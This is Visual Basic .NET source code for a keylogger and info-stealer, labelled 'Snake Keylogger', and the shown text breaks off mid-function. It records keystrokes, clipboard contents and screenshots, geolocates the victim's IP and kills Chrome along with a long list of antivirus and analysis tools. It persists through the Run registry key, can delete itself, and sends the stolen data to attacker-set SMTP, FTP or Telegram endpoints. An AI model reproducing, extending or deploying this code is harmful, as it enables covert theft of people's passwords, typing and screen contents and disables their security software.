Imports System.IO
Imports System.Net
Imports System.Net.Mail
Imports System.Runtime.CompilerServices
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Text.RegularExpressions
Imports System.Xml
Imports Microsoft.VisualBasic.CompilerServices
Imports Microsoft.Win32
Imports System
Imports Microsoft.VisualBasic
Imports System.Diagnostics
Imports System.Windows.Forms
Imports System.Drawing
Imports System.Collections.Generic
Imports System.Threading
Imports System.Collections.Specialized
Imports System.Management
Imports System.Security.Principal

Public Class COVIDisDanger

    Public Shared Function Z(x As String) As RegistryKey
        Dim i As RegistryKey = Registry.CurrentUser.OpenSubKey("Software\" + x, True)
        Dim flag As Boolean = Not checksubkey(i)
        If flag Then
            i = Registry.CurrentUser.CreateSubKey("Software\" + x)
        End If
        Return i
    End Function
    Public Shared Function checksubkey(k As RegistryKey) As Boolean
        Dim flag As Boolean = k Is Nothing
        Return Not flag
    End Function
    Private Shared Function GetMngObj(className As String) As ManagementObject
        Dim wmi As ManagementClass = New ManagementClass(className)
        For Each o As ManagementBaseObject In wmi.GetInstances()
            Dim mo As ManagementObject = CType(o, ManagementObject)
            Dim flag As Boolean = mo IsNot Nothing
            If flag Then
                Return mo
            End If
        Next
        Return Nothing
    End Function
    Public Shared Function GetOsVer() As String
        Dim result As String
        Try
            Dim mo As ManagementObject = GetMngObj("Win32_OperatingSystem")
            Dim flag As Boolean = mo Is Nothing
            If flag Then
                result = String.Empty
            Else
                result = TryCast(mo("Version"), String)
            End If
        Catch e As Exception
            result = String.Empty
        End Try
        Return result
    End Function
End Class
Module COVID19

    Public StoragePW As String
    Public THKLog As String
    Public logRecoverType As String = "%ReccoveryTypeext%$"
    Dim TPSHProc As Process() = Process.GetProcesses
    Public WithEvents KPPlogS As New System.Windows.Forms.Timer()
    Public WithEvents Scrlogtimerrr As New System.Windows.Forms.Timer()
    Public WithEvents Clpreptimerr As New System.Windows.Forms.Timer()
    Public WithEvents clprEPs As New System.Windows.Forms.Timer()
    Public WithEvents kLLTIm As New System.Windows.Forms.Timer()
    Public WithEvents TPSSends As New System.Windows.Forms.Timer()
    Public WithEvents ProHfutimer As New System.Windows.Forms.Timer()
    Private _currentWindow As String
    Dim QJDFjPqkSr As String = "$$TypesHere%%"
    Public GrabbedClp As String = ""
    Dim HSHChecker As String = "$#TheHashHere%&"
    Private _hook As KeyLogger
    Private keylogs As New StringBuilder
    'Public TheInfo As String = " " + vbNewLine + vbNewLine + "| System Information | " + vbNewLine & vbNewLine + "Computer Name: " + Environment.MachineName & vbNewLine & "Machine Name: " + OSComputer() + vbNewLine + "Machine PlatForm: " + OSPlatform() + vbNewLine + "Computer IP: " + IPLogger() + vbNewLine + "Country Name: " + TheCountryNameInfo() + vbNewLine +
    '    "Country Code: " + TheCountryCodeInfo() + vbNewLine + "Time Zone: " + TheTimeZoneInfo() + vbNewLine + "Full Location: " + FullAddressLink() + vbNewLine + "Date and Time: " + TimeandDateInfo() + vbNewLine + "Total Hard Disk Space: " + TheHardDiskSpace() + vbNewLine + "Ram Space: " + RamSizePC() + vbNewLine +
    '    "Hardware ID: " + hardwere("", "")
    Dim TheInfo As String = " " + vbNewLine + vbNewLine + "PC Name:" + Environment.MachineName & vbNewLine + "Date and Time: " + TimeandDateInfo() & vbNewLine + "Client IP" + IPLogger() + vbNewLine + "Country Name: " + TheCountryNameInfo() + vbNewLine


#Region " SMTP Details"
    Dim TheSMTPEmail As String = "%$MailSender$%"
    Dim TheSMTPPSWD As String = "%$MailPassword$%"
    Dim TheSMTPServer As String = "%$MailServer$%"
    Dim TheSMTPReciver As String = "%$MailReciver$%"
    Dim TheSMTPPort As String = "%$MailPort$%"
#End Region

#Region " FTP Details"
    Dim TheFTPUsername As String = "%$HostUsername$%"
    Dim TheFTPPSWD As String = "%$HostPassword$%"
    Dim TheFTPURL As String = "%$HostURL$%"
#End Region

#Region " Telegram Details"
    Dim TheTelegramToken As String = "%$TeleToken$%"
    Dim TheTelegramID As String = "%$TeleID$%"
#End Region

#Region " Another Details & File Locations"
    Public loccle As String

#End Region

#Region " Killers Functions"

    '%ProcessHackerBodygard%  Public Sub ProcessHackerKiller(sender As Object, e As EventArgs) Handles ProHfutimer.Tick
    '%ProcessHackerBodygard% Try
    '%ProcessHackerBodygard% For Each prog As Process In Process.GetProcesses
    '%ProcessHackerBodygard%  If prog.ProcessName = "ProcessHacker" Then
    '%ProcessHackerBodygard%                  prog.Kill()
    '%ProcessHackerBodygard%   End If
    '%ProcessHackerBodygard%  Next
    '%ProcessHackerBodygard%   Catch Z As Exception
    '%ProcessHackerBodygard%   End Try
    '%ProcessHackerBodygard%    End Sub




    '%ProcessTaskKiller%  Public Sub ProccesssKillersFuc(sender As Object, e As EventArgs) Handles kLLTIm.Tick
    '%ProcessTaskKiller% Try
    '%ProcessTaskKiller% For Each prog As Process In Process.GetProcesses
    '%ProcessTaskKiller%  If prog.ProcessName = "%tKill%" Then
    '%ProcessTaskKiller%                  prog.Kill()
    '%ProcessTaskKiller%   End If
    '%ProcessTaskKiller%  Next
    '%ProcessTaskKiller%   Catch Z As Exception
    '%ProcessTaskKiller%   End Try
    '%ProcessTaskKiller%    End Sub

    Sub Chrome_Killer()
        On Error Resume Next
        For KKEE As Integer = 0 To TPSHProc.Length - 1
            Select Case Strings.LCase(TPSHProc(KKEE).ProcessName)
                Case "chrome"
                    TPSHProc(KKEE).Kill()
                Case Else
            End Select
        Next
    End Sub
    Public Sub killle()
        Dim listt As String() = {"zlclient", "egui", "bdagent", "npfmsg", "olydbg", "anubis", "wireshark", "avastui", "_Avp32", "vsmon", "mbam", "keyscrambler", "_Avpcc", "_Avpm", "Ackwin32", "Outpost", "Anti-Trojan", "ANTIVIR", "Apvxdwin", "ATRACK", "Autodown", "Avconsol", "Ave32", "Avgctrl", "Avkserv", "Avnt", "Avp", "Avp32", "Avpcc", "Avpdos32", "Avpm", "Avptc32", "Avpupd", "Avsched32", "AVSYNMGR", "Avwin95", "Avwupd32", "Blackd", "Blackice", "Cfiadmin", "Cfiaudit", "Cfinet", "Cfinet32", "Claw95", "Claw95cf", "Cleaner", "Cleaner3", "Defwatch", "Dvp95", "Dvp95_0", "Ecengine", "Esafe", "Espwatch", "F-Agnt95", "Findviru", "Fprot", "F-Prot", "F-Prot95", "Fp-Win", "Frw", "F-Stopw", "Iamapp", "Iamserv", "Ibmasn", "Ibmavsp", "Icload95", "Icloadnt", "Icmon", "Icsupp95", "Icsuppnt", "Iface", "Iomon98", "Jedi", "Lockdown2000", "Lookout", "Luall", "MCAFEE", "Moolive", "Mpftray", "N32scanw", "NAVAPSVC", "NAVAPW32", "NAVLU32", "Navnt", "NAVRUNR", "Navw32", "Navwnt", "NeoWatch", "NISSERV", "Nisum", "Nmain", "Normist", "NORTON", "Nupgrade", "Nvc95", "Outpost", "Padmin", "Pavcl", "Pavsched", "Pavw", "PCCIOMON", "PCCMAIN", "Pccwin98", "Pcfwallicon", "Persfw", "POP3TRAP", "PVIEW95", "Rav7", "Rav7win", "Rescue", "Safeweb", "Scan32", "Scan95", "Scanpm", "Scrscan", "Serv95", "Smc", "SMCSERVICE", "Snort", "Sphinx", "Sweep95", "SYMPROXYSVC", "Tbscan", "Tca", "Tds2-98", "Tds2-Nt", "TermiNET", "Vet95", "Vettray", "Vscan40", "Vsecomr", "Vshwin32", "Vsstat", "Webscanx", "WEBTRAP", "Wfindv32", "Zonealarm", "LOCKDOWN2000", "RESCUE32", "LUCOMSERVER", "avgcc", "avgcc", "avgamsvr", "avgupsvc", "avgw", "avgcc32", "avgserv", "avgserv9", "avgserv9schedapp", "avgemc", "ashwebsv", "ashdisp", "ashmaisv", "ashserv", "aswUpdSv", "symwsc", "norton", "Norton Auto-Protect", "norton_av", "nortonav", "ccsetmgr", "ccevtmgr", "avadmin", "avcenter", "avgnt", "avguard", "avnotify", "avscan", "guardgui", "nod32krn", "nod32kui", "clamscan", "clamTray", "clamWin", "freshclam", "oladdin", "sigtool", "w9xpopen", "Wclose", "cmgrdian", "alogserv", "mcshield", "vshwin32", "avconsol", "vsstat", "avsynmgr", "avcmd", "avconfig", "licmgr", "sched", "preupd", "MsMpEng", "MSASCui", "Avira.Systray"}
        For Each keke As Process In Process.GetProcesses
            For Each nmleola As String In listt
                If keke.ProcessName = nmleola Then
                    keke.Kill()
                    Exit For
                End If
            Next
        Next
    End Sub
    Public Function Killme(a As String) As Object
        Dim flageeee As Boolean = Process.GetProcessesByName(a).Length > 0
        If flageeee Then
            Process.GetCurrentProcess().Kill()
        End If
        Return Nothing ' ah gawad heshta functin akan mna hhhhhhhhhh
    End Function
    Public Function killz(a As String) As Object 'estash haman nawn layxom hhhhhhh
        Dim flaggg As Boolean = File.Exists(a)
        If flaggg Then
            Process.GetCurrentProcess().Kill()
        End If
        Return Nothing
    End Function

#End Region

#Region " Features Functions"

    Function hash_generator(ByVal file_name As String) As String
        Dim hash = SHA256.Create()
        Dim hashValue() As Byte
        Dim fileStream As FileStream = IO.File.OpenRead(file_name)
        fileStream.Position = 0
        hashValue = hash.ComputeHash(fileStream)
        fileStream.Close()
        Dim hmhj As String = ""
        Dim i As Integer
        For i = 0 To hashValue.Length - 1
            hmhj += hashValue(i).ToString("X2")
        Next i
        Return hmhj.ToLower
    End Function

    Public Sub SelfDestruct()
        Try
            Process.Start(New ProcessStartInfo() With {.Arguments = "/C choice /C Y /N /D Y /T 3 & Del """ + Application.ExecutablePath + """", .WindowStyle = ProcessWindowStyle.Hidden, .CreateNoWindow = True, .FileName = "cmd.exe"})
            Environment.[Exit](1)
        Catch ex As Exception
        End Try
    End Sub

    Public Declare Function GetModuleFileNameqwq Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Integer, ByVal lpFileName As String, ByVal nSize As Integer) As Integer
    Public Declare Function ExitProcess23 Lib "kernel32" Alias "ExitProcess" (ByVal uExitCode As UInteger) As Integer
    Public Declare Function MoveFile232 Lib "kernel32" Alias "MoveFileExW" (<[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpExistingFileName As String, <[In](), MarshalAs(UnmanagedType.LPTStr)> ByVal lpNewFileName As String, ByVal dwdvsdfdbdtyd As Long) As Integer



    Public Sub MeltMele()
        MoveFile232(Microsoft.VisualBasic.Strings.Left(Application.ExecutablePath, GetModuleFileNameqwq(0, Application.ExecutablePath, 256)), System.IO.Path.GetTempPath + "\tmpG" + Date.Now.Millisecond.ToString + ".tmp", 8)
    End Sub

    Public Sub AddToStartup(ByVal name As String, ByVal path As String)
        Try
            Dim Regqw As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
            Dim Keelol As Microsoft.Win32.RegistryKey = Regqw.OpenSubKey("software\microsoft\windows\currentversion\run", True)
            Keelol.SetValue(name, path, Microsoft.Win32.RegistryValueKind.String)
        Catch
        End Try
    End Sub

#End Region

#Region " Telegram Function"

    Private Sub UploadsKeyboardHere(filename As String, contentType As String, url As String, content As String)
        Try
            Dim webClient As WebClient = New WebClient()
            Dim a As Stream = New System.IO.MemoryStream()
            Dim text As String = "------------------------" + DateTime.Now.Ticks.ToString("x")
            webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text)

            Dim [string] As String = content
            Dim s As String = String.Format("--{0}" & vbCrLf & "Content-Disposition: form-data; name=""document""; filename=""{1}""" & vbCrLf & "Content-Type: {2}" & vbCrLf & vbCrLf & "{3}" & vbCrLf & "--{0}--" & vbCrLf, New Object() {text, filename, contentType, [string]})
            Dim bytes As Byte() = webClient.Encoding.GetBytes(s)
            webClient.UploadData(url, "POST", bytes)
        Catch ex As Exception


        End Try
    End Sub


    ' ============  Clipboard ============
    Private Sub ClpUploader(filename As String, contentType As String, url As String, content As String)
        Try
            Dim webClient As WebClient = New WebClient()
            Dim a As Stream = New System.IO.MemoryStream()
            Dim text As String = "------------------------" + DateTime.Now.Ticks.ToString("x")
            webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text)

            Dim [string] As String = content
            Dim s As String = String.Format("--{0}" & vbCrLf & "Content-Disposition: form-data; name=""document""; filename=""{1}""" & vbCrLf & "Content-Type: {2}" & vbCrLf & vbCrLf & "{3}" & vbCrLf & "--{0}--" & vbCrLf, New Object() {text, filename, contentType, [string]})
            Dim bytes As Byte() = webClient.Encoding.GetBytes(s)
            webClient.UploadData(url, "POST", bytes)
        Catch ex As Exception


        End Try
    End Sub

    ' ============  Passwords ============
    Private Sub PWUploader(filename As String, contentType As String, url As String, content As String)
        Try
            Dim webClient As WebClient = New WebClient()
            Dim a As Stream = New System.IO.MemoryStream()
            Dim text As String = "------------------------" + DateTime.Now.Ticks.ToString("x")
            webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text)

            Dim [string] As String = content
            Dim s As String = String.Format("--{0}" & vbCrLf & "Content-Disposition: form-data; name=""document""; filename=""{1}""" & vbCrLf & "Content-Type: {2}" & vbCrLf & vbCrLf & "{3}" & vbCrLf & "--{0}--" & vbCrLf, New Object() {text, filename, contentType, [string]})
            Dim bytes As Byte() = webClient.Encoding.GetBytes(s)
            webClient.UploadData(url, "POST", bytes)
        Catch ex As Exception


        End Try
    End Sub

    ' ============  Screenshot ============
    Private Sub MultiUploader(file As Byte(), filename As String, contentType As String, url As String)
        Try
            Dim webClient As WebClient = New WebClient()
            Dim text As String = "------------------------" + DateTime.Now.Ticks.ToString("x")
            webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text)
            Dim [string] As String = webClient.Encoding.GetString(file)
            Dim s As String = String.Format("--{0}" & vbCrLf & "Content-Disposition: form-data; name=""document""; filename=""{1}""" & vbCrLf & "Content-Type: {2}" & vbCrLf & vbCrLf & "{3}" & vbCrLf & "--{0}--" & vbCrLf, New Object() {text, filename, contentType, [string]})
            Dim bytes As Byte() = webClient.Encoding.GetBytes(s)
            webClient.UploadData(url, "POST", bytes)

        Catch ex As Exception

        End Try
    End Sub
    Public Sub TelSender(tokennns As String, urrid As String, msg As String)
        Try
            Dim Api = "https://api.telegram.org/bot" + tokennns + "/sendMessage?chat_id=" + urrid + "&text=" + msg
            ServicePointManager.Expect100Continue = False
            ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)

            Dim request As HttpWebRequest = DirectCast(WebRequest.Create(Api), HttpWebRequest)

            Dim ErrMsg As String = String.Empty

            Try

                Dim response As WebResponse = request.GetResponse()

                Using responseStream As Stream = response.GetResponseStream()
                    Dim reader As New StreamReader(responseStream, Encoding.UTF8)
                    reader.ReadToEnd()
                    Return
                End Using
            Catch ex As WebException

                ErrMsg = ex.Message.ToString
                Dim errorResponse As WebResponse = ex.Response
                Using responseStream As Stream = errorResponse.GetResponseStream()
                    Dim reader As New StreamReader(responseStream, Encoding.GetEncoding("utf-8"))

                    Dim errorText As [String] = reader.ReadToEnd()
                End Using
                Throw
            End Try
        Catch ex As Exception
        End Try


    End Sub


#End Region

#Region " Encryptions/Decryptions & RND Genarators"

    Dim PASSWORD = "ZyiAEnXWZP" & (New Random).Next().ToString

#End Region

#Region " The Info Details Functions"

    Public Function TheHardDiskSpace()
        Dim allDrives() As IO.DriveInfo = IO.DriveInfo.GetDrives()
        Dim totalbytes As Long
        Dim d As IO.DriveInfo
        For Each d In allDrives

            If d.IsReady = True Then
                totalbytes += d.TotalSize

            End If
        Next
        totalbytes = totalbytes / 1048576 / 1024
        Dim Outputs As String = totalbytes & " GB"
        Return Outputs
    End Function

    Public Function TimeandDateInfo()
        Dim TheTimeHere = DateAndTime.Today + "   /    " + DateAndTime.TimeOfDay
        Return TheTimeHere
    End Function
    Public Function OSComputer()
        Dim os = My.Computer.Info.OSFullName
        Return os
    End Function
    Public Function OSVersion()
        Dim osv = My.Computer.Info.OSVersion
        Return osv
    End Function
    Public Function RamSizePC()
        Dim gb As Double
        Dim b2gb As Double = 1024 * 1024 * 1024
        gb = My.Computer.Info.TotalPhysicalMemory / b2gb
        Dim K = String.Format("{0:f2} GB", gb)
        Return K
    End Function
    Public Function IPLogger()
        Dim client As New WebClient
        client.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR1.0.3705;)")
        Dim baseurl As String = "http://checkip.dyndns.org/"
        Dim proxy As IWebProxy = WebRequest.GetSystemWebProxy()
        proxy.Credentials = CredentialCache.DefaultNetworkCredentials
        client.Proxy = proxy
        Dim data As Stream
        Try
            data = client.OpenRead(baseurl)
        Catch ex As Exception
        End Try
        Dim reader As StreamReader = New StreamReader(data)
        Dim s As String = reader.ReadToEnd()
        data.Close()
        reader.Close()
        s = s.Replace("<html><head><title>Current IP Check</title></head><body>", "").Replace("</body></html>", "").Replace("Current IP Address: ", "").ToString()
        Return s
    End Function


    Public Function TheCountryNameInfo()
        Dim doc As XmlDocument = New XmlDocument
        Dim getdetetails = "https://freegeoip.app/xml/" + IPLogger()
        doc.Load(getdetetails)
        Dim CountryNamelist = doc.GetElementsByTagName("CountryName")
        Dim TheCountryName As String = ""
        For Each item3 As System.Xml.XmlElement In CountryNamelist
            TheCountryName = item3.InnerText
        Next
        Return TheCountryName
    End Function

#End Region

#Region " Clipboard Logger"

    'Public Sub ClipboardReplacer(sender As Object, e As EventArgs) Handles Clpreptimerr.Tick

    '    GrabbedClp += GetClipboard() + vbNewLine

    'End Sub

    Function GetDataClipboard() As Byte()
        Dim s As String = "Clipboard | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & GrabbedClp & vbNewLine & vbNewLine & "--------------------------------------------------"
        Dim data As Byte() = Encoding.Unicode.GetBytes(s)
        Return data
    End Function
    Public Sub ClipboardReplacer(sender As Object, e As EventArgs) Handles Clpreptimerr.Tick
        If GrabbedClp.ToString.Contains(My.Computer.Clipboard.GetText.Replace(".", "<.>").Replace("http", "<http>")) Then
        Else
            GrabbedClp += My.Computer.Clipboard.GetText.Replace(".", "<.>").Replace("http", "<http>") + vbNewLine
        End If
    End Sub

    Public Sub ClipboardSender(sender As Object, e As EventArgs) Handles clprEPs.Tick

        If QJDFjPqkSr = "%FTPDV$" Then

            Dim ftpRequest As FtpWebRequest = CType(WebRequest.Create(TheFTPURL + My.Computer.Name + " - Clipboard Logs ID - " + PASSWORD + logRecoverType), FtpWebRequest)
            Try
                ftpRequest.Method = WebRequestMethods.Ftp.UploadFile
                ftpRequest.Credentials = New NetworkCredential(TheFTPUsername, TheFTPPSWD)
                Dim bytes() As Byte = System.Text.Encoding.UTF8.GetBytes("Clipboard | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & GrabbedClp & vbNewLine & vbNewLine & "--------------------------------------------------")
                ftpRequest.ContentLength = bytes.Length
                Using UploadStream As Stream = ftpRequest.GetRequestStream()
                    UploadStream.Write(bytes, 0, bytes.Length)
                    UploadStream.Close()
                End Using
            Catch ex As Exception
                Exit Sub
            End Try

        End If
        If QJDFjPqkSr = "$%SMTPDV$" Then
            Try
                'Dim Writter As StreamWriter = New StreamWriter(path23)
                'Dim aa = "Clipboard | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & GrabbedClp & vbNewLine & vbNewLine & "--------------------------------------------------"
                'Writter.Write(aa)
                'Writter.Close()
                Dim MyMailMessageVAR As New MailMessage()
                MyMailMessageVAR.From = New MailAddress((TheSMTPEmail))
                MyMailMessageVAR.To.Add(TheSMTPReciver)
                MyMailMessageVAR.Subject = (" Pc Name: " & Environment.UserName + " | Snake Keylogger")
                MyMailMessageVAR.Body = ("Clipboard | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine)
                Dim data As Byte() = GetDataClipboard()


                Dim ms As New MemoryStream(data)
                MyMailMessageVAR.Attachments.Add(New Attachment(ms, "Clipboard" + logRecoverType, "text/plain"))
                Dim SMTPVAR As New SmtpClient(TheSMTPServer)
                SMTPVAR.EnableSsl = True
                SMTPVAR.Port = (TheSMTPPort)
                SMTPVAR.Credentials = New System.Net.NetworkCredential(TheSMTPEmail, TheSMTPPSWD)
                SMTPVAR.Send(MyMailMessageVAR)
                MyMailMessageVAR.Dispose()

            Catch ex As Exception
            End Try
        End If

        If QJDFjPqkSr = "$%TelegramDv$" Then
            Try
                Dim aa = "Clipboard | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & GrabbedClp & vbNewLine & vbNewLine & "--------------------------------------------------"
                ServicePointManager.Expect100Continue = False
                ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
                Dim url As String = String.Concat(New String() {"https://api.telegram.org/bot", TheTelegramToken, "/sendDocument?chat_id=", TheTelegramID, "&caption=", " Pc Name: " & Environment.UserName + " | Snake Keylogger" + vbNewLine + vbNewLine + "Clipboard | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine})
                ClpUploader("Clipboard" + logRecoverType, "application/x-ms-dos-executable", url, aa)
                Return
            Catch ex As Exception
            End Try
        End If
    End Sub



#End Region

#Region " Screenshot Logger"
    Public Sub TakeScreenshot(sender As Object, e As EventArgs) Handles Scrlogtimerrr.Tick


        Dim intlole As String = "Screenshot"
        Dim exttlo As String = ".png"
        Dim patheth As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\" & "SnakeKeylogger"
        Try
            If IO.Directory.Exists(patheth) Then
                loccle = My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\" & "SnakeKeylogger" & "\" & intlole & exttlo
                Dim ScreenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(screenGrab)
                g.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
                screenGrab.Save(loccle)
                ScreenshotSender()
                ClearScreenshotFiles()
            Else
                IO.Directory.CreateDirectory(patheth)
                Dim ScreenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
                Dim g As System.Drawing.Graphics = System.Drawing.Graphics.FromImage(screenGrab)
                g.CopyFromScreen(New Point(0, 0), New Point(0, 0), ScreenSize)
                screenGrab.Save(loccle)
                ScreenshotSender()
                ClearScreenshotFiles()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Sub ScreenshotSender()
        If QJDFjPqkSr = "%FTPDV$" Then
            Dim ftpRequest As FtpWebRequest = CType(WebRequest.Create(TheFTPURL + My.Computer.Name + " - Screenshot Logs ID - " + PASSWORD + ".png"), FtpWebRequest)
            Try
                ftpRequest.Method = WebRequestMethods.Ftp.UploadFile
                ftpRequest.Credentials = New NetworkCredential(TheFTPUsername, TheFTPPSWD)
                Dim bytes() As Byte = System.IO.File.ReadAllBytes(loccle)
                ftpRequest.ContentLength = bytes.Length
                Using UploadStream As Stream = ftpRequest.GetRequestStream()
                    UploadStream.Write(bytes, 0, bytes.Length)
                    UploadStream.Close()
                    File.Delete(loccle)
                End Using
            Catch ex As Exception

                Exit Sub

            End Try

        End If
        If QJDFjPqkSr = "$%SMTPDV$" Then
            Try
                Dim MyMailMessageVAR As New MailMessage()
                MyMailMessageVAR.From = New MailAddress(TheSMTPEmail)
                MyMailMessageVAR.To.Add(TheSMTPReciver)
                MyMailMessageVAR.Subject = (" Pc Name: " & Environment.UserName + " | Snake Keylogger")
                MyMailMessageVAR.Body = ("Screenshot | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine)
                Dim attach As Net.Mail.Attachment = New Net.Mail.Attachment(loccle)
                MyMailMessageVAR.Attachments.Add(attach)

                Dim SMTPVAR As New SmtpClient(TheSMTPServer)
                SMTPVAR.EnableSsl = True
                SMTPVAR.Port = (TheSMTPPort)
                SMTPVAR.Credentials = New System.Net.NetworkCredential(TheSMTPEmail, TheSMTPPSWD)
                SMTPVAR.Send(MyMailMessageVAR)
                MyMailMessageVAR.Dispose()
                ClearScreenshotFiles()
            Catch ex As Exception
            End Try
        End If

        If QJDFjPqkSr = "$%TelegramDv$" Then
            Try
                Dim file As Byte() = IO.File.ReadAllBytes(loccle)
                ServicePointManager.Expect100Continue = False
                ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
                Dim url As String = String.Concat(New String() {"https://api.telegram.org/bot", TheTelegramToken, "/sendDocument?chat_id=", TheTelegramID, "&caption=", " Pc Name: " & Environment.UserName + " | Snake Keylogger" + vbNewLine + vbNewLine + "Screenshot | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine})

                MultiUploader(file, loccle, "application/x-ms-dos-executable", url)
                Return
            Catch ex As Exception

            End Try
        End If

#Region "Telegram Screenshot Sender"
        ' == ( Kill After Sent Problem ) ==

        'If TELLE = "Tretzhh" Then
        '    Try
        '        Dim file As Byte() = IO.File.ReadAllBytes(loccle)
        '        Dim url As String = String.Concat(New String() {"https://api.telegram.org/bot", thetoken, "/sendDocument?chat_id=", TheID})
        '        MultiUploader(file, loccle, "application/x-ms-dos-executable", url)
        '    Catch ex As Exception

        '    End Try

        '  End If
#End Region

    End Sub


#Region "Telegram Screenshot Sender Function"
    'Private Sub MultiUploader(file As Byte(), filename As String, contentType As String, url As String)
    '    Try
    '        Dim webClient As WebClient = New WebClient()
    '        Dim text As String = "------------------------" + DateTime.Now.Ticks.ToString("x")
    '        webClient.Headers.Add("Content-Type", "multipart/form-data; boundary=" + text)
    '        Dim [string] As String = webClient.Encoding.GetString(file)
    '        Dim s As String = String.Format("--{0}" & vbCrLf & "Content-Disposition: form-data; name=""document""; filename=""{1}""" & vbCrLf & "Content-Type: {2}" & vbCrLf & vbCrLf & "{3}" & vbCrLf & "--{0}--" & vbCrLf, New Object() {text, filename, contentType, [string]})
    '        Dim bytes As Byte() = webClient.Encoding.GetBytes(s)
    '        webClient.UploadData(url, "POST", bytes)
    '        Environment.[Exit](0)
    '    Catch
    '    End Try
    'End Sub
#End Region

    Sub ClearScreenshotFiles()
        Dim patheth As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\" & "SnakeKeylogger"
        On Error Resume Next
        If IO.Directory.Exists(patheth) Then
            IO.Directory.Delete(patheth, True)
        End If
    End Sub
#End Region

#Region " Keyboard Logger"




    Function GetDataKeyboard() As Byte()
        Dim s As String = "KP | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & keylogs.ToString & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
        Dim data As Byte() = Encoding.Unicode.GetBytes(s)
        Return data
    End Function

    Private Sub KeyboardSender(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles KPPlogS.Tick



        If QJDFjPqkSr = "%FTPDV$" Then


            Dim ftpRequest As FtpWebRequest = CType(WebRequest.Create(TheFTPURL + My.Computer.Name + " - keystroke Logs ID - " + PASSWORD + logRecoverType), FtpWebRequest)
            Try
                ftpRequest.Method = WebRequestMethods.Ftp.UploadFile
                ftpRequest.Credentials = New NetworkCredential(TheFTPUsername, TheFTPPSWD)
                Dim bytes() As Byte = System.Text.Encoding.UTF8.GetBytes("KP | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & keylogs.ToString & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------")
                ftpRequest.ContentLength = bytes.Length
                Using UploadStream As Stream = ftpRequest.GetRequestStream()
                    UploadStream.Write(bytes, 0, bytes.Length)
                    UploadStream.Close()

                    COVID19.THKLog = ""


                End Using
            Catch ex As Exception

                Exit Sub

            End Try

        End If
        If QJDFjPqkSr = "$%SMTPDV$" Then
            Try
                'Dim Writter As StreamWriter = New StreamWriter(path24)
                'Dim aa = "KP | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & keylogs.ToString & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
                'Writter.Write(aa)
                'Writter.Close()
                Dim MyMailMessageVAR As New MailMessage()
                MyMailMessageVAR.From = New MailAddress((TheSMTPEmail))
                MyMailMessageVAR.To.Add(TheSMTPReciver)
                MyMailMessageVAR.Subject = (" Pc Name: " & Environment.UserName + " | Snake Keylogger")
                Dim data As Byte() = GetDataKeyboard()


                Dim ms As New MemoryStream(data)
                MyMailMessageVAR.Attachments.Add(New Attachment(ms, "Keystrokes" + logRecoverType, "text/plain"))
                MyMailMessageVAR.Body = ("KP | " + Environment.UserName + " | Snake" & vbNewLine & vbNewLine & vbNewLine)
                Dim SMTPVAR As New SmtpClient(TheSMTPServer)
                SMTPVAR.EnableSsl = True
                SMTPVAR.Port = TheSMTPPort
                SMTPVAR.Credentials = New System.Net.NetworkCredential(TheSMTPEmail, TheSMTPPSWD)
                SMTPVAR.Send(MyMailMessageVAR)
                MyMailMessageVAR.Dispose()

                COVID19.THKLog = ""

            Catch ex As Exception
            End Try
        End If

        If QJDFjPqkSr = "$%TelegramDv$" Then

            Try
                Dim aa = "Keylogger | " + Environment.UserName + " | Snake" & vbNewLine & TheInfo & vbNewLine & vbNewLine & vbNewLine & keylogs.ToString & vbNewLine & vbNewLine & vbNewLine & "--------------------------------------------------"
                ServicePointManager.Expect100Continue = False
                ServicePointManager.SecurityProtocol = CType(3072, SecurityProtocolType)
